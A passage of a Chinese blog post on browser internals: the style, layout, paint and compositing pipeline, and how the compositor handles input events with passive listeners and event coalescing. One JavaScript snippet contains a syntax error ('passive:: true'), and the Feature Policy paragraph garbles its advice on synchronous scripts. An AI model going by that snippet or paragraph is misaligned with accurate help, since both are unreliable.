id="样式计算"><a href="#样式计算" class="headerlink" title="样式计算"></a>样式计算</h2><p>只拥有 DOM 不足以确定页面的外观，因为我们会在 CSS 中设置页面元素的样式。主线程解析 CSS 并确定每个 DOM 节点计算后的样式。这是有关基于 CSS 选择器对每个元素应用何种样式的信息，这可以在 DevTools 的 <code>computed</code> 部分中看到。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616966199-811ab322-812e-4302-a1f8-e191bc2e8e42.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616966199-811ab322-812e-4302-a1f8-e191bc2e8e42.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 3：主线程解析 CSS 以添加计算后样式</p><p>即使你不提供任何 CSS，每个 DOM 节点都具有计算样式。像 <code>&lt;h1&gt;</code> 标签看起来比 <code>&lt;h2&gt;</code> 标签大，每个元素都有 margin，这是因为浏览器具有默认样式表。如果你想知道更多 Chrome 的默认 CSS，<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/css/html.css">可以在这里看到源代码</a>。</p><p><a name="5aefca55"></a></p><h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>现在，渲染进程知道每个节点的样式和文档的结构，但这不足以渲染页面。想象一下，你正试图通过手机向朋友描述一幅画：“这里有一个大红圈和一个小蓝方块”，这并不能让你的朋友知道这幅画究竟长什么样。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616974801-873a48df-424e-48d5-b663-465acdde0a3b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616974801-873a48df-424e-48d5-b663-465acdde0a3b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 4：一个人站在一幅画前，电话线与另一个人相连</p><p>布局是计算元素几何形状的过程。主线程遍历 DOM，计算样式并创建布局树，其中包含 x y 坐标和边界框大小等信息。布局树可能与 DOM 树结构类似，但它仅包含页面上可见内容相关的信息。如果一个元素应用了 <code>display：none</code>，那么该元素不是布局树的一部分（但 <code>visibility：hidden</code> 的元素在布局树中）。类似地，如果应用了如 <code>p::before&#123;content:&quot;Hi!&quot;&#125;</code> 的伪类，则即使它不在 DOM 中，也包含于布局树中。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616983665-27566c02-307e-47de-af21-e1e2b8bea6f8.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599616983665-27566c02-307e-47de-af21-e1e2b8bea6f8.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 5：主线程遍历计算样式后的 DOM 树，以此生成布局树</p><p><img src="https://cdn.nlark.com/yuque/0/2020/gif/164572/1599617069400-412be90b-f35e-4136-9057-673b42f6b644.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/gif/164572/1599617069400-412be90b-f35e-4136-9057-673b42f6b644.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="3-1.gif"></p><p>图 6：由于换行而移动的盒子布局</p><p>确定页面布局是一项很有挑战性的任务。即使是从上到下的块流这样最简单的页面布局，也必须考虑字体的大小以及换行位置，这些因素会影响段落的大小和形状，进而影响下一个段落的位置。</p><p>CSS 可以使元素浮动到一侧、隐藏溢出的元素、更改书写方向。你可以想象这一阶段的任务之艰巨。Chrome 浏览器有整个工程师团队负责布局。<a href="https://www.youtube.com/watch?v=Y5Xa4H2wtVA">BlinkOn 会议的一些访谈</a>记录了他们工作的细节，有兴趣可以了解一下，挺有趣的。</p><p><a name="b196b7cf"></a></p><h2 id="绘制"><a href="#绘制" class="headerlink" title="绘制"></a>绘制</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617001845-6fe976a9-f8e4-4d52-b9e8-8f0cbf23a41f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617001845-6fe976a9-f8e4-4d52-b9e8-8f0cbf23a41f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 7：一个人拿着笔站在画布前，思考着她应该先画圆形还是先画方形</p><p>拥有 DOM、样式和布局仍然不足以渲染页面。假设你正在尝试重现一幅画。你知道元素的大小、形状和位置，但你仍需要判断绘制它们的顺序。</p><p>例如，可以为某些元素设置 <code>z-index</code>，此时按 HTML 中编写的元素的顺序绘制会导致错误的渲染。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617009442-2a9605de-fe23-4173-9d68-7cd9560d1eec.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617009442-2a9605de-fe23-4173-9d68-7cd9560d1eec.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 8：因为没有考虑 z-index，页面元素按 HTML 标记的顺序出现，导致错误的渲染图像</p><p>在绘制步骤中，主线程遍历布局树创建绘制记录。绘制记录是绘图过程的记录，就像是“背景优先，然后是文本，然后是矩形”。如果你使用过 JavaScript 绘制了 <code>&lt;canvas&gt;</code> 元素，那么这个过程对你来说可能很熟悉。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617017546-6e89e4ed-fde3-42eb-a85f-40dceaab9d6e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617017546-6e89e4ed-fde3-42eb-a85f-40dceaab9d6e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 9：主线程遍历布局树并生成绘制记录</p><p><a name="2778d675"></a></p><h3 id="更新渲染管道的成本很高"><a href="#更新渲染管道的成本很高" class="headerlink" title="更新渲染管道的成本很高"></a>更新渲染管道的成本很高</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617114971-f2dbbb36-7fab-4d96-8ae9-d697b6d07676.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617114971-f2dbbb36-7fab-4d96-8ae9-d697b6d07676.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 10：DOM + Style、布局和绘制树的生成顺序</p><p>渲染管道中最重要的事情是：每个步骤中，前一个操作的结果用于后一个操作创建新数据。例如，如果布局树中的某些内容发生改变，需要为文档的受影响部分重新生成“绘制”指令。</p><p>如果要为元素设置动画，则浏览器必须在每个帧之间运行这些操作。大多数显示器每秒刷新屏幕 60 次（60 fps），当屏幕每帧都在变化，人眼会觉得动画很流畅。但是，如果动画丢失了中间一些帧，页面看起来就会卡顿（janky）。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617121888-038a6c49-8dd3-46a1-925b-39347a5121e7.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617121888-038a6c49-8dd3-46a1-925b-39347a5121e7.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 11：时间轴上的动画帧</p><p>即使渲染操作能跟上屏幕刷新，这些计算也会在主线程上运行，这意味着当你的应用程序运行 JavaScript 时动画可能会被阻塞。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617129751-f70ab9bb-06b1-4dd8-8e3c-39dfe9b26911.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617129751-f70ab9bb-06b1-4dd8-8e3c-39dfe9b26911.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 12：时间轴上的动画帧，但 JavaScript 阻塞了一帧</p><p>你可以将 JavaScript 操作划分为小块，并使用 <code>requestAnimationFrame()</code> 在每个帧上运行。有关此主题的更多信息，请参阅 <a href="https://developers.google.com/web/fundamentals/performance/rendering/optimize-javascript-execution">Optimize JavaScript Execution</a>。你也可以<a href="https://www.youtube.com/watch?v=X57mh8tKkgE">在 Web Worker 中运行 JavaScript</a> 以避免阻塞主线程。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617137709-2c3a4a12-e63b-4872-abb7-5e92e3396b95.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617137709-2c3a4a12-e63b-4872-abb7-5e92e3396b95.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 13：时间轴上较小的 JavaScript 块与动画帧一起运行</p><p><a name="c29e4097"></a></p><h2 id="合成"><a href="#合成" class="headerlink" title="合成"></a>合成</h2><p><a name="f9dca3c4"></a></p><h3 id="如何绘制一个页面？"><a href="#如何绘制一个页面？" class="headerlink" title="如何绘制一个页面？"></a>如何绘制一个页面？</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617165140-bc377abc-2cc4-4c1c-b61f-7f20b57fe9d3.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617165140-bc377abc-2cc4-4c1c-b61f-7f20b57fe9d3.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 14：简单光栅处理示意动画</p><p>现在浏览器知道文档的结构、每个元素的样式、页面的几何形状和绘制顺序，它是如何绘制页面的？把这些信息转换为屏幕上的像素，我们称为光栅化。</p><p>处理这种情况的一种简单的方法是，先在光栅化视窗内的画面，如果用户滚动页面，则移动光栅框，并光栅化填充缺少的部分。这就是 Chrome 首次发布时处理光栅化的方式。但是，现代浏览器会运行一个更复杂的过程，我们称为合成。</p><p><a name="9d33d874"></a></p><h3 id="什么是合成"><a href="#什么是合成" class="headerlink" title="什么是合成"></a>什么是合成</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/gif/164572/1599617193349-1b1eec0e-9282-43d0-a626-d4250586804c.gif" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/gif/164572/1599617193349-1b1eec0e-9282-43d0-a626-d4250586804c.gif" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="3-5.gif"></p><p>图 15：合成处理示意动画</p><p>合成是一种将页面的各个部分分层，分别光栅化，并在称为合成线程的单独线程中合成为页面的技术。如果发生滚动，由于图层已经光栅化，因此它所要做的只是合成一个新帧。动画也可以以相同的方式（移动图层和合成新帧）实现。</p><p>你可以在 DevTools 使用 <a href="https://blog.logrocket.com/eliminate-content-repaints-with-the-new-layers-panel-in-chrome-e2c306d4d752?gi=cd6271834cea">Layers 面板</a> 看看你的网站如何被分层。</p><p><a name="a58f1691"></a></p><h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>为了分清哪些元素位于哪些图层，主线程遍历布局树创建图层树（此部分在 DevTools 性能面板中称为“Update Layer Tree”）。如果页面的某些部分应该是单独图层（如滑入式侧面菜单）但没拆分出来，你可以使用 CSS 中的 <code>will-change</code> 属性来提示浏览器。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617197636-f2905a7f-fe09-4b8d-95f1-d20b42e03a6e.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617197636-f2905a7f-fe09-4b8d-95f1-d20b42e03a6e.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 16：主线程遍历布局树生成图层树</p><p>你可能想要为每个元素都分层，但是合成大量的图层可能会比每帧都光栅化页面的刷新方式更慢，因此测量应用程序的渲染性能至关重要。有关这个主题的更多信息，请参阅 <a href="https://developers.google.com/web/fundamentals/performance/rendering/stick-to-compositor-only-properties-and-manage-layer-count">Stick to Compositor-Only Properties and Manage Layer Count</a>。</p><p><a name="df1192c3"></a></p><h3 id="主线程的光栅化和合成"><a href="#主线程的光栅化和合成" class="headerlink" title="主线程的光栅化和合成"></a>主线程的光栅化和合成</h3><p>一旦创建了图层树并确定了绘制顺序，主线程就会将该信息提交给合成线程。接着，合成线程会光栅化每个图层。一个图层可能会跟整个页面一样大，因此合成线程将它们分块后发送到光栅线程。光栅线程光栅化每个小块后会将它们存储在显存中。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617205653-985b211a-9023-4b91-8f6e-818351f26d57.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617205653-985b211a-9023-4b91-8f6e-818351f26d57.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图17：光栅线程创建分块的位图并发送到 GPU</p><p>合成线程会给不同的光栅线程设置优先级，以便视窗（或附近）内的画面可以先被光栅化。图层还具有多个不同分辨率的块，可以处理放大操作等动作。</p><p>一旦块被光栅化，合成线程会收集这些块的信息（称为<strong>绘制四边形</strong>）创建<strong>合成帧</strong>。</p><p>绘制四边形</p><p>包含诸如图块在内存中的位置，以及合成时绘制图块在页面中的位置等信息。</p><p>合成帧</p><p>一个绘制四边形的集合，代表一个页面的一帧。</p><p>接着，合成帧通过 IPC（进程间通讯）提交给浏览器进程。此时，可以从 UI 线程或其他插件的渲染进程添加另一个合成帧。这些合成器帧被发送到 GPU 然后在屏幕上显示。如果接收到滚动事件，合成线程会创建另一个合成帧发送到 GPU。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617214337-c98717ad-57a9-457c-a936-0926ab93ce12.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617214337-c98717ad-57a9-457c-a936-0926ab93ce12.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 18：合成线程创建合成帧，将其发送到浏览器进程，再接着发送到 GPU</p><p>合成的好处是它可以在不涉及主线程的情况下完成。合成线程不需要等待样式计算或 JavaScript 执行。这就是为什么<a href="https://www.html5rocks.com/en/tutorials/speed/high-performance-animations/">仅合成动画</a>被认为是流畅性能的最佳选择。如果需要再次计算布局或绘制，则必须涉及主线程。</p><p><a name="eNBNH"></a></p><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>在这一部分中，我们研究了渲染管道从解析到合成的整个过程，希望现在你能自主地去了解更多关于网站性能优化的信息。<br />在本系列的下一部分也是最后一部分中，我们将更详细地介绍合成线程，看看当用户移动或点击鼠标时会发生什么。</p><p><a name="Yw4q0"></a></p><h1 id="第四部分"><a href="#第四部分" class="headerlink" title="第四部分"></a>第四部分</h1><p><a name="5f05a04d"></a></p><h2 id="用户输入行为与合成器"><a href="#用户输入行为与合成器" class="headerlink" title="用户输入行为与合成器"></a>用户输入行为与合成器</h2><p>内部揭秘系列博客对现代浏览器如何处理代码、显示页面展开探讨。该系列博客共四篇，这是最后一篇。在上篇博客里，我们了解了 <a href="https://developers.google.com/web/updates/2018/09/inside-browser-part3">渲染进程与合成器</a>。这里我们将一窥当用户输入行为发生时，合成器如何继续保障交互流畅。</p><p><a name="24e93a7e"></a></p><h2 id="浏览器视角下的输入事件"><a href="#浏览器视角下的输入事件" class="headerlink" title="浏览器视角下的输入事件"></a>浏览器视角下的输入事件</h2><p>听到“输入事件”这个字眼，你脑海里闪现的恐怕只是输入文本或点击鼠标。但在浏览器眼中，输入意味着一切用户行为。不单滚动鼠标滑轮是输入事件，触摸屏幕、滑动鼠标同样也是用户输入事件。</p><p>诸如触摸屏幕之类用户手势产生时，浏览器进程会率先将其捕获。然而浏览器进程所掌握的信息仅限于行为发生的区域，因为标签页里的内容都由渲染进程负责处理，所以浏览器进程会将事件类型（如 <code>touchstart</code>）及其坐标发送给渲染进程。渲染进程会寻至事件目标，运行其事件监听器，妥善地处理事件。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617571139-45d3ac9d-6abe-4772-8e68-c68fec9ef28a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617571139-45d3ac9d-6abe-4772-8e68-c68fec9ef28a.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 1：输入事件由浏览器进程发往渲染进程</p><p><a name="50c136ae"></a></p><h2 id="合成器接收输入事件"><a href="#合成器接收输入事件" class="headerlink" title="合成器接收输入事件"></a>合成器接收输入事件</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617588105-c1fafd40-4006-4e45-9ba7-db24977c7317.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617588105-c1fafd40-4006-4e45-9ba7-db24977c7317.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 2：悬于页面图层的视图窗口</p><p>在上篇文章里，我们探讨了合成器如何通过合成栅格化图层，实现流畅的页面滚动。如果页面上没有添加任何事件监听，合成器线程会创建独立于主线程的新合成帧。但要是页面上添加了事件监听呢？合成器线程又是如何得知事件是否需要处理的？</p><p><a name="7d55be63"></a></p><h2 id="理解非立即可滚动区"><a href="#理解非立即可滚动区" class="headerlink" title="理解非立即可滚动区"></a>理解非立即可滚动区</h2><p>因为运行 JavaScript 脚本是主线程的工作，所以页面合成后，合成线程会将页面里添加了事件监听的区域标记为“非立即可滚动区”。有了这个信息，如果输入事件发生在这一区域，合成线程可以确定应将其发往主线程处理。如输入事件发生在这一区域之外，合成线程则确定无需等待主线程，而继续合成新帧。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617639083-b50d9822-736d-4f27-922a-0bccc18f94d3.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617639083-b50d9822-736d-4f27-922a-0bccc18f94d3.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 3：非立即可滚动区输入描述示意图</p><p><a name="4e7abbc5"></a></p><h3 id="设置事件处理器时须注意"><a href="#设置事件处理器时须注意" class="headerlink" title="设置事件处理器时须注意"></a>设置事件处理器时须注意</h3><p>web 开发中常用的事件处理模式是事件代理。因为事件会冒泡，所以你可以在最顶层的元素中添加一个事件处理器，用来代理事件目标产生的任务。下面这样的代码，你可能见过，或许也写过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">document.body.addEventListener(&#x27;touchstart&#x27;, </span><br><span class="line">event =&gt; &#123;</span><br><span class="line">    if (event.target === area) &#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样只需添加一个事件处理器，即可监听所有元素，的确十分省事。然而，如果站在浏览器的角度去考量，这等于把整个页面都标记成了“非立即可滚动区”，意味着即便你设计的应用本不必理会页面上一些区域的输入行为，合成线程也必须在每次输入事件产生后与主线程通信并等待返回。如此则得不偿失，使原本能保障页面滚动流畅的合成器没了用武之地。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617652730-c7bc2e88-1e9d-4752-a4a0-88268a4c3729.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617652730-c7bc2e88-1e9d-4752-a4a0-88268a4c3729.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 4：非立即可滚动区覆盖整个页面下的输入描述示意图</p><p>你可以给事件监听添加一个 <code>[passive:true](https://developer.mozilla.org/en-US/docs/Web/API/EventTarget/addEventListener#Improving_scrolling_performance_with_passive_listeners)</code> 选项 ，将这种负面效果最小化。这会提示浏览器你想继续在主线程中监听事件，但合成器不必停滞等候，可接着创建新的合成帧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">document.body.addEventListener(&#x27;touchstart&#x27;, event =&gt; &#123;</span><br><span class="line">    if (event.target === area) &#123;</span><br><span class="line">        event.preventDefault()</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;, &#123;passive: true&#125;);</span><br></pre></td></tr></table></figure><p><a name="8309d096"></a></p><h2 id="检查事件是否可撤销"><a href="#检查事件是否可撤销" class="headerlink" title="检查事件是否可撤销"></a>检查事件是否可撤销</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617659981-dab98eae-dba4-4e00-ac04-1b94e4aabf75.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617659981-dab98eae-dba4-4e00-ac04-1b94e4aabf75.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 5：部分区域仅可水平方向滚动的网页</p><p>设想一下这种情形：页面上有一个盒子，你要将其滚动方向限制为水平滚动。</p><p>为目标事件设置 <code>passive:true</code> 选项可让页面滚动平滑，但在你使用 <code>preventDefault</code> 以限制滚动方向时，垂直方向滚动可能已经触发。使用 <code>event.cancelable</code> 方法可以检查并阻止这种情况发生。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">document.body.addEventListener(&#x27;pointermove&#x27;, event =&gt; &#123;</span><br><span class="line">    if (event.cancelable) &#123;</span><br><span class="line">        event.preventDefault(); // 阻止默认的滚动行为</span><br><span class="line">        /*</span><br><span class="line">        *  这里设置程序执行任务</span><br><span class="line">        */</span><br><span class="line">    &#125; </span><br><span class="line">&#125;, &#123;passive:: true&#125;);</span><br></pre></td></tr></table></figure><p>或者，你也可以应用 <code>touch-action</code> 这类 CSS 规则，完全地将事件处理器屏蔽掉。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#area &#123; </span><br><span class="line">  touch-action: pan-x; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="063d68e2"></a></p><h2 id="定位事件目标"><a href="#定位事件目标" class="headerlink" title="定位事件目标"></a>定位事件目标</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617668976-70fe0d91-6607-4a0a-a71d-bb2231465a3d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617668976-70fe0d91-6607-4a0a-a71d-bb2231465a3d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 6：主线程检查绘制记录查询坐标 x、y 处绘制内容</p><p>合成器将输入事件发送至主线程后，首先运行的是命中检测。命中检测会使用渲染进程中产生的绘制记录数据，找出事件发生坐标下的内容。</p><p><a name="d791b565"></a></p><h2 id="降低往主线程发送事件的频率"><a href="#降低往主线程发送事件的频率" class="headerlink" title="降低往主线程发送事件的频率"></a>降低往主线程发送事件的频率</h2><p>之前的文章里，我们探讨了常见显示屏如何以每秒 60 帧的频率刷新，以及我们要怎样与其刷新频率保持步调一致，以营造出流畅的动画效果。而对于用户的输入行为，常见触摸屏设备的事件传输频率为每秒 60~120 次，常见鼠标设备的事件传输频率为每秒 100 次。可见，输入事件有着比显示屏幕更高的保真度。</p><p>如果一连串 <code>touchmove</code> 这样的事件以每秒 120 次的频率发送往主线程，那么可能会触发过量的命中检测及 JavaScript 脚本执行。相形而言，我们的屏幕刷新率则更为低下。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617676154-ac76c52a-fb38-42e3-baea-718f9fb25b52.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617676154-ac76c52a-fb38-42e3-baea-718f9fb25b52.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 7：大量事件涌入合成帧时间轴会造成页面闪烁</p><p>为了降低往主线程中传递过量调用，Chrome 会合并这些连续事件（如：<code>wheel</code>, <code>mousewheel</code>, <code>mousemove</code>, <code>pointermove</code>, <code>touchmove</code> 等），并将其延迟至下一次 <code>requestAnimationFrame</code> 前发送。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617682519-c93cb336-12a1-4698-bdd4-082700a99498.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617682519-c93cb336-12a1-4698-bdd4-082700a99498.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 8：相同的时间轴下事件被合并且延迟发送</p><p>所有独立的事件，如: <code>keydown</code>, <code>keyup</code>, <code>mouseup</code>, <code>mousedown</code>, <code>touchstart</code>, 及  <code>touchend</code> 则会立即发往主线程。</p><p><a name="0cc9abc4"></a></p><h2 id="使用-getCoalescedEvents-获取帧内事件"><a href="#使用-getCoalescedEvents-获取帧内事件" class="headerlink" title="使用 getCoalescedEvents 获取帧内事件"></a>使用 <code>getCoalescedEvents</code> 获取帧内事件</h2><p>事件合并可帮助大多数 web 应用构建良好的用户体验。然而，如果你开发的是一个绘图类应用，需要基于 <code>touchmove</code> 事件的坐标绘制线路，那么在你试图画下一根光滑的线条时，区间内的一些坐标点也可能会因事件合并而丢失。这时，你可以使用目标事件的  <code>getCoalescedEvents</code> 方法获取事件合并后的信息。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617699750-626e95d0-1729-4d8f-8025-b26d06e648aa.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1599617699750-626e95d0-1729-4d8f-8025-b26d06e648aa.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>图 9：左为流畅的触摸手势路径、右为事件合并后的有限路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">window.addEventListener(&#x27;pointermove&#x27;, event =&gt; &#123;</span><br><span class="line">    const events = event.getCoalescedEvents();</span><br><span class="line">    for (let event of events) &#123;</span><br><span class="line">        const x = event.pageX;</span><br><span class="line">        const y = event.pageY;</span><br><span class="line">        // 使用 x、y 坐标画线</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="fc0952b5"></a></p><h2 id="后续步骤"><a href="#后续步骤" class="headerlink" title="后续步骤"></a>后续步骤</h2><p>本系列文章里，我们探讨了很多关于 web 浏览器内部的工作原理。如果之前你从来没想过：为什么 Devtools 推荐在事件处理器上添加 <code>&#123;passive:true&#125;</code> 选项、为什么有时须在 script 标签里添加 <code>async</code> 属性？那么我希望这一系列文章能帮助你了解，为什么传递这些信息给浏览器能让其提供更为迅捷流畅的 web 体验。</p><p><a name="f5a9afa0"></a></p><h3 id="使用-Lighthouse"><a href="#使用-Lighthouse" class="headerlink" title="使用 Lighthouse"></a>使用 Lighthouse</h3><p>如果你想构建出对浏览器更为友好的代码，却一直毫无头绪，那么不妨先从使用 <a href="https://developers.google.com/web/tools/lighthouse/">Lighthouse</a> 开始。Lighthouse 是个可以帮助你审查网站工具，并且能提供页面性能报告。性能报告会告诉你什么地方处理得当，什么地方有待提升。浏览审查列表也能让你了解浏览器着力关注的重点所在。</p><p><a name="ffa7e0b9"></a></p><h3 id="学习如何评测性能"><a href="#学习如何评测性能" class="headerlink" title="学习如何评测性能"></a>学习如何评测性能</h3><p>对于不同的站点，桎梏其性能之处可能不尽相同，所以专门为你自己的站点定制化一套性能评测方案，并择优选取技术应用，是重中之重。Chrome 的 Devtools 团队就 <a href="https://developers.google.com/web/tools/chrome-devtools/speed/get-started">如何测试你的站点性能</a> 撰有相关教程可供参阅。</p><p><a name="fcb2f19e"></a></p><h3 id="为你的站点添加-Feature-Policy"><a href="#为你的站点添加-Feature-Policy" class="headerlink" title="为你的站点添加 Feature Policy"></a>为你的站点添加 Feature Policy</h3><p>如果你想进一步采用更多方案，<a href="https://developers.google.com/web/updates/2018/06/feature-policy">Feature Policy</a> 是一个新的 web 平台，可在开发时为你保驾护航。开启 feature policy 可以限制应用行为，并使你远离诸多技术弊端。举个例子，如果你想确保应用不会阻塞解析，那么可以采用同步脚本方案运行应用。开启 <code>sync-script:&#39;none&#39;</code> 后，导致解析阻塞的 JavaScript 脚本会被阻止运行。这就确保了你的代码不会阻塞解析，浏览器也无须考虑暂停运行解析器。</p><p><a name="Rz4Sx"></a></p><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p><img 